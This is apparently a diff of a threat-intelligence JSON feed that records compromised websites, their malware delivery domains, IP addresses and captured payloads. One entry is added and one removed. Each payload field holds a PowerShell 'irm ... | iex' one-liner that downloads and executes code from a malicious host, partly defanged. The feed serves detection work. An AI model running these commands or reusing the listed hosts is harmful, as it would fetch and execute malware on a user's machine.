@@ -1,5 +1,31 @@
 [
   {
+    "UrlDomain": "amadvancedmarketing.com",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "93.127.179.134"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/a54d10080461e81a",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2&amp;_v=29921815",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/a54d10080461e81a'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/a54d10080461e81a"
+    ],
+    "ReportId": "cmwr4m1rl2b0o0omlqujsc9z5",
+    "ScannedAt": "2026-11-22T00:56:18.622000+00:00"
+  },
+  {
     "UrlDomain": "cursosesferaquantica.com.br",
     "DeliveryUrl": [
       "img-codes-cloude.info"
@@ -2389,24 +2415,5 @@
     ],
     "ReportId": "cmwoarw6c1ytk0omlfgbkqvw7",
     "ScannedAt": "2026-11-20T01:25:30.403000+00:00"
-  },
-  {
-    "UrlDomain": "zekoturizm.com",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/f6e1bc839f837436"
-    ],
-    "IP": [
-      "37.18.61.132"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/f6e1bc839f837436')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/f6e1bc839f837436"
-    ],
-    "ReportId": "cmwo9kdgz1ys80omlr22sxrni",
-    "ScannedAt": "2026-11-20T00:51:39.997000+00:00"
   }
 ]
